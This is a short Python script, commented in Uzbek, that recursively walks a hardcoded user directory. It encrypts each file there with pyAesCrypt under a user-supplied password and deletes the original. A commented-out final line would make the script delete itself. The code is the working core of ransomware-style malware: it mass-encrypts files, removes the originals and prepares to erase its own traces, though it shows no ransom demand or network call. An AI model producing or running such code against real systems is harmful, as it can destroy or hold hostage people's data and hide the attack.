import pyAesCrypt
import os
import sys


# fayllarni shifrlaydigan funksiya
def encryption(file, password):
    # bufer hajmini belgilaymiz
    buffer_size = 512 * 1024

    # shifrlaydigan metodni chaqiramiz
    pyAesCrypt.encryptFile(
        str(file),
        str(file) + ".crp",
        password,
        buffer_size
    )

    # natijani ko'rish uchun shifrlangan fayl nomini chop etamiz
    print("[Fayl '" + str(os.path.splitext(file)[0]) + "' Shifrlandi]")

    # asl faylni o'chirib tashlaymiz
    os.remove(file)


# kataloglarni skanerlash funksiyasi
def walking_by_dirs(dir, password):
    # belgilangan katalogdagi barcha pastki kataloglar bo'ylab aylanish
    for name in os.listdir(dir):
        path = os.path.join(dir, name)

        # agar fayl toplsa shifrlaymiz
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)
        # agar  katalog toplsa, u holda fayllarni qidirishda siklni takrorlaymiz
        else:
            walking_by_dirs(path, password)


password = input("shifrlash uchun parol kiriting: ")
walking_by_dirs("/home/yevgenevic/Music", password)
# os.remove(str(sys.argv[0]))
